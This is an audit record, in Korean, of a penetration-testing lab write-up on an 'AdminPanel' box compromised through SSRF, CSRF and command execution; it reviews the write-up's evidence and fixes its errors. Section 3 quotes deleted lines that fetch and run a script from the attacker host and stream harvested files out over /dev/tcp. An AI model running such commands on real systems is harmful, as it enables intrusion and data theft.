---
type: audit
target: "03. PG/AdminPanel.md"
date: 2026-09-09
---

# AdminPanel — 적대적 검증 기록

검증 대상 `03. PG\AdminPanel.md`(418행 → 453행). 산출물 `~/PG/AdminPanel/` 전량 · Kali `/tmp/apwww/`·`/tmp/e.out` · 볼트 `파일보관\PG-AdminPanel-panel-3000.png` · 규격 정본 `F:\project\DOC_TEMPLATE`.

## 1. 최우선 의심 항목 — tmux 인용 블록 3종의 판정

### 판정 — **존치. 캡션을 「원문 미보존」으로 하향.** 날조 판정 근거 부재

지시받은 전제는 「`ap-*` 세션 부재 → 출처 검증 불가」였고, 그 전제 자체는 재확인으로 사실. 그러나 **부재 증거의 등급 상한은 `근거부족`** 이고, 아래 양성 증거가 세 블록의 값·시각을 전부 모순 없이 지지.

**존재 방향의 양성 증거 (전부 파일 실측):**

| 증거 | 무엇을 지지하는가 |
|---|---|
| `openurl/resp_4.json` — `http://192.168.45.247/ssrfcheck` → `ERR_CONNECTION_REFUSED`(14:37:47) vs `openurl/b_00.json` — `http://192.168.45.247/probe.html` → `{"message":"Opened URL: …"}`(14:39:26) | **Kali 측 80 리스너가 두 시각 사이에 실제로 기동.** `ap-web80` 실재의 직접 근거 |
| `/tmp/apwww/probe.html`(117B, 14:39:15) · `x.html`(1,815B, 14:41:56) · `r.html`(340B, 14:42:27) · `harvest.sh`(3,055B, 14:43:40) | 인용 로그가 요구하는 파일 4종이 요구하는 시각에 전부 실재 |
| `/tmp/e.out`(25B, 14:41:14) = `{"error":"Access denied"}` | 노트 인용과 바이트 일치 |
| `_SUMMARY.txt` — recon.sh 가 만든 세션명 `rc-AdminPanel-full`·`rc-AdminPanel-gb`. 현재 살아 있는 AuthBy 세션은 `ab-gb242`·`ab-rev443`·`rc-AuthBy` | **러너의 tmux 명명 규약이 `<박스 2자 약어>-<용도>`.** `ab-rev443` 과 `ap-rev443` 은 같은 규약의 같은 자리 — `ap-*` 접두는 창작된 이름이 아니라 규약 산물 |
| `proof_root.txt` — 타겟 pty 프롬프트 `root@localhost:/app#`, 타겟 시각 `05:43:43 UTC` = **14:43:43 KST** | `ap-rev443` 리버스셸 세션 실재. 트리거 시각 14:42:45 → 58초 뒤 플래그 캡처로 정합 |
| `app_source_capture.txt` — 명령 2회 echo · 80칸 줄바꿈 · 프롬프트 재출력 | 같은 pty 세션의 뒤쪽 구간. 재구성이 아니라 전사 |
| `harvest.out`(60B, 14:45:08) = `수집 완료: /tmp/.h/harvest.txt` / `1406 /tmp/.h/harvest.txt`, 그리고 `wc -l harvest.txt` = **1406** | 「ap-rev443 캡처」로 적힌 출력이 실은 **파일로 존재**. 아래 정정 3 |

**차등 CSRF 테스트에 대한 총괄 전제의 반증** — 「A~E 5기법 차등 테스트를 담은 파일은 존재하지 않는다」는 사실과 다름. **`/tmp/apwww/x.html`(1,815바이트, 14:41:56 KST)이 실재**하며 A~E 5기법과 `HIT-<기법>-<키>` 콜백 8종을 그대로 담고 있음. 미보존인 것은 「테스트 페이지」가 아니라 「리스너가 받은 결과」 한쪽뿐.

**결과(B·D 만 도달)의 독립 검증** — `app_source_capture.txt` 의 `/app/app.js` 만으로 연역 가능.
- `bodyParser.json()`·`bodyParser.urlencoded()` 만 등록 → `text/plain`(기법 A·C) 은 어느 파서도 파싱하지 않아 `req.body` 공집합 → `Missing command` 400 → 콜백 부재
- CORS 헤더 전무 → `application/json` 교차오리진(기법 E) 은 프리플라이트 단계에서 브라우저가 차단 → 실제 요청 미발사
- `const { command } = req.body` → 8개 후보 키 중 `command` 만 읽힘
즉 노트가 「콜백만으로 역추적」했다고 적은 결론은 소스가 그대로 재확인. **결론은 근거를 갈아끼워도 서므로 하향 대상 아님.**

**그럼에도 하향한 것** — 인용 로그 자체의 재현성. 세 캡션을 「원문 미보존」으로 바꾸고, `## 관련` 의 원문 미보존 목록에 리스너 3종을 명시. 블록 본문은 존치(A-1 — 요약본으로 대체하고 침묵 금지).

## 2. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `// C/D: form 제출 (text/plain 인코딩된 JSON, urlencoded)` | **코드펜스 개작.** `/tmp/apwww/x.html` 원문은 `// C: form enctype text/plain -> JSON` | 원문으로 복원 |
| `var s=JSON.stringify(o);` | **코드펜스에서 원문 1구 탈락.** 원문은 `var s=JSON.stringify(o); var i=s.lastIndexOf("\"}");` | 원문으로 복원 |
| `/tmp/puppeteer_dev_chrome_profile-*` **112건** | `grep -c` 가 **파일 전체 매칭 라인 수**를 센 것. PROCS 절의 크로미움 프로세스 인자 라인이 대량 포함. 실제 `/tmp` 목록(harvest.txt TMP 절)의 프로필 디렉터리는 **14건** | 14건으로 정정 |
| 「실제 호출 횟수가 저장된 페이로드 파일 수(약 33개)보다 훨씬 많았다는 근거」 | **결론 붕괴.** 14 < 33 이므로 반대 방향. 잔존 디렉터리 수는 호출 횟수의 하한이 아님 | 「호출 최소 33회, 대부분 `browser.close()` 로 정리되고 잔존분만 남은 상태」로 교체 |
| `— 출처: tmux capture-pane -p -t ap-rev443`(harvest 실행 블록) | **출처 오기.** 그 두 줄은 `~/PG/AdminPanel/harvest.out`(60B)에 그대로 존재하는 **파일 증적** | 파일로 재인용. 행수 `1406` 이 `wc -l harvest.txt` 와 일치함을 병기 |
| `cp /app/app.js /tmp/app.js.copy; curl -s …` bash 펜스 | 명령 원문 미보존인데 실행 캡처처럼 펜스에 실림 | 펜스 제거. 파일 근거(`/tmp/h.sh` 3,055B = `/tmp/apwww/harvest.sh` 3,055B, `/tmp/app.js.copy`)로 산문 서술 |
| 「공통 파일명 프로브 … 등 **25종**」 | `web-3000/probe-index.txt` 는 **26행** | 26종으로 정정, 출처 파일 병기 |
| 「경로 후보 41개」 | 정확(`routes.txt`·`routefuzz.txt` 각 41행). 지시문의 46 이 오기 | 변경 없음 |
| 비-http 스킴 **10종** 목록 + `file://192.168.45.247/x` 별도 행 | `file://…` 가 목록과 별도 행에 **이중 계상** | 목록을 9종으로 조정, 별도 행 존치 |
| 「스킴 우회 **18종** 일괄 발사」 | `pl1.txt` 18행은 스킴 우회만이 아님 | 「후보 18종 — 공격자 페이지 1 · 비-http 스킴 10 · 대문자 스킴 1 · 루프백 포트 6」으로 내역 명시 |
| 「받은 콜백은 아래 **두 건**뿐」 + 4행 블록 | 서술과 블록 행수 불일치 | 「페이지 로드 뒤 되돌아온 `HIT-*` 콜백은 B·D 두 건」으로 한정 |
| 631 — 「`3000` 에서 RCE 가 먼저 성립해 이쪽은 더 파고들지 않은 상태」 | **시간 서사 오류.** 631 시도(`b_11`)는 14:39:30, RCE 는 14:42:45 로 631 이 **먼저** | 「배제가 아니라 미완」을 명시하고 인과 서술 제거 |
| `### Privilege Escalation`(4항목 부재, 기법명 없는 제목) | **구조 결손.** 정본 `pg-machine-md` 는 이 절에도 4항목 요구 | `### Privilege Escalation – 해당 없음, Express 애플리케이션이 root 로 구동` + 4항목 신설([[Interface]] 선례 형식) |
| `Local.txt value:` 라벨 부재 | 정본 필수 라벨. 요약에도 `local.txt` 언급 부재 | 라벨 신설 + `harvest.txt` FLAGS 절 원문 인용. 요약에 「`local.txt` 없음 — 단일 플래그 박스」 추가 |
| 요약에 「권한상승:」 줄 부재 | 정본 S-04 형식 | 「권한상승: 해당 없음 — …」 줄 신설 |
| `![[PG-AdminPanel-panel-3000.png]]` 아래 평문 설명 | A-6 캡션 형식(`*그림 N — …*`) 미준수 | `*그림 1 — …*` 로 교체, 1장뿐인 사유를 별도 문단으로 분리 |
| app 소스 캡션 「코드 내용은 무편집」 | **과장.** 줄바꿈 재조립 외에 들여쓰기 정규화(탭 → 공백)도 이뤄짐 | 「토큰은 무편집, 줄바꿈 재조립과 들여쓰기 정규화를 거친 판본」으로 정정 |
| `/tmp/e.out` 캡션의 변명조 서술 | 「`~/PG/AdminPanel/` 밖의 산출물이나 같은 작업 시간대에 생성」 = 문서가 자기 작성 경위를 서술(A-2-1) | 응답 전문·바이트 수만 남김 |
| 채점 3요건 서술 부재 | 웹셸 취득 여부·그림 미확보 사유가 `Post-Exploitation` 에 미기재 | 「웹셸 경유 아님 + 근거」·「그림 증적 미확보 사유」 항목 신설 |
| 「비어 있음」·「남아 있음」·「좁혀짐」·「리스닝 없음」 | A-4 명사형 어미 | 「빈 디렉터리」·「잔존」·「국한」·「리스닝 부재」 |
| 「파일로 저장하지 않았고 세션도 현존하지 않음」 | A-2-1 — 자기 행위에 인식론 서술 부착 | 삭제. 「원문 미보존」 토큰만 존치 |

## 3. 삭제한 것 — 원문 인용

되살릴 수 있도록 삭제 원문을 그대로 남김.

```text
| 부산물 | `/tmp/puppeteer_dev_chrome_profile-*` 112건(harvest.txt 문자열 매칭 기준) | `/open-url` 호출마다 헤드리스 크로미움이 남긴 프로필 디렉터리 — 실제 호출 횟수가 저장된 페이로드 파일 수(약 33개)보다 훨씬 많았다는 근거 | 잔존 |
```

```text
이후 열거·정리 흔적:

```bash
cp /app/app.js /tmp/app.js.copy; curl -s http://192.168.45.247/harvest.sh -o /tmp/h.sh && sh /tmp/h.sh > /tmp/harvest.out 2>&1; tail -5 /tmp/harvest.out; ls -la /tmp/harvest.out
```
```

```text
harvest 결과는 `/dev/tcp` 로 직접 스트리밍해 Kali 로 회수(`cat /tmp/.h/harvest.txt > /dev/tcp/192.168.45.247/9001`), 별도 리스너(tmux `ap-rx`)로 수신.
```
— 회수 사실은 존치(`harvest.txt` 168,561B, 14:45:33 KST). **명령 문자열만** 원문 미보존으로 하향.

```text
`631/tcp` CUPS — nmap 배너로 `Forbidden` 확인.
이후 SSRF 로 내부(`127.0.0.1:631/admin/`) 접근을 한 차례 시도해 `ERR_INVALID_AUTH_CREDENTIALS`(기본 인증 요구)만 확인.
그 외 CUPS 경로·자격증명 시도 기록 부재 — `3000` 에서 RCE 가 먼저 성립해 이쪽은 더 파고들지 않은 상태.
```

## 4. 반증한 것 — 지적으로 올랐다가 노트가 옳았던 것

1. **컨테이너 아님(VM) 판정** — `harvest.txt:291`(`root 1 … /sbin/init`) · `:1263`(`/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4`) · `:1254`(`ens192`) · `:1277~1279`(snapd squashfs 3종). 노트 판정이 옳음.
2. **`/tmp/apwww/x.html`·`r.html` 실재** — 총괄 전제 「차등 테스트 파일 부재」의 반증. 위 1절.
3. **`proof_root.txt` 시각 자기모순 의심** — 타겟 출력 `05:43:43 AM UTC` vs Kali mtime `14:43:58 KST`. **UTC+9 환산 시 14:43:43 로 15초 선행, 정합.** 모순 부재.
4. **`routes.txt` 41행** — 노트 기재가 옳고 지시문의 「46」이 오기.
5. **스크린샷 창작 의심** — `파일보관\PG-AdminPanel-panel-3000.png` 와 `~/PG/AdminPanel/shot_3000_root.png` 의 md5 가 `8bf514548ed1f7b88b988b70e4f9fe64` 로 일치. 이미지를 직접 열어 확인한 화면이 노트 서술(「Query website」 입력폼 하나)과 일치. 창작 흔적 부재.
6. **`try.py` 코드펜스** — `~/PG/AdminPanel/try.py` 와 바이트 일치. 개작 부재.
7. **`/app/app.js` 소스 펜스** — 토큰 단위로 `app_source_capture.txt` 와 일치. 개작 부재(들여쓰기 정규화만).
8. **`root@localhost:/app#` 프롬프트** — 타겟 pty 프롬프트로 1급 증거. 존치.
9. **`writeup_notes.txt` 부재로 인한 내심 서술** — 「러너가 …라고 판단했다」류 부재. 동기 서술은 전부 산출물 mtime 순서로 뒷받침(예 「이 시점에는 소스 미확보」 — `x.html` 14:41:56 < `app_source_capture.txt` 14:44:19).
10. **`exec/` 빈 디렉터리** — 노트가 「비어 있음」으로 정직하게 기재. 재구성 curl 을 출력 블록과 함께 실은 흔적 부재.
11. **Kali 프롬프트 창작(`┌──(kali㉿kali)`)** — 노트 전체에 0건.
12. **`tech/web/csrf` 태그** — 사슬상 실재. `/exec` 는 Origin·Referer·토큰 검사 없이 `req.connection.remoteAddress` 만 보고 상태변경 요청을 수락하며, 실제 공격이 「피해자(서버측 브라우저)의 네트워크 위치를 빌린 교차오리진 상태변경 POST」 형태(`x.html`·`r.html`). 태그 유지 타당. **다만 taxonomy 는 공유 인프라라 감사자가 변경하지 않음.**

## 5. 근거 출처

- Kali 산출물 — `~/PG/AdminPanel/` 전량(`nmap-full.txt`·`gobuster-3000.txt`·`routes.txt`·`routefuzz.txt`·`pl1.txt`·`try.py`·`openurl/payload_1~15`·`resp_1~15`·`b_00~17`·`web-3000/probe-*`·`app_source_capture.txt`·`proof_root.txt`·`harvest.out`·`harvest.txt`·`_SUMMARY.txt`·`recon-run.log`·`shot_3000_root.png`)
- Kali 공격 호스트 — `/tmp/apwww/{probe,x,r}.html`·`harvest.sh` · `/tmp/e.out`
- 볼트 — `파일보관\PG-AdminPanel-panel-3000.png`(직접 열람 + md5 대조)
- 규격 정본 — `F:\project\DOC_TEMPLATE\REFERENCE.md` · `templates\report-base\report.base.md`(A-1~A-7, A-2-1) · `templates\pg-machine-md\`(META.md 절 대응표 · 템플릿 본문)
- 선례 노트 — `03. PG\Interface.md`(권한상승 부재 박스의 4항목 서술 형식) · `03. PG\Covfefe.md`(그림 캡션 형식)
- 직접 실행 — `ssh kali@10.44.44.128` 상의 `ls -laR --time-style=full-iso` · `wc -l` · `cat -A` · `grep -c` · `md5sum` · `tmux ls`(읽기 전용)

## 6. 총괄 판단이 필요한 것

- **색인 갱신 필요** — 노트 행수·본문 변경. `refresh.ps1` 은 공유 인프라라 미실행.
- **`_STATUS.md` 판정** — AdminPanel · 완료 1/1 · 방식 판정은 세션로그 소관. 감사자 미기록.
- **`_PLAYBOOK` 이관** — `AdminPanel-forge.md` 의 후보 4건 중 1~3 은 산출물로 뒷받침 확인. **후보 4(「살아있는 tmux 세션으로 복원 가능」)는 이관 부적합** — 그 세션들이 지금 존재하지 않아 방법론으로서 재현성 부재이고, 오히려 「리스너 로그는 즉시 파일로 떨어뜨릴 것」이 교훈.
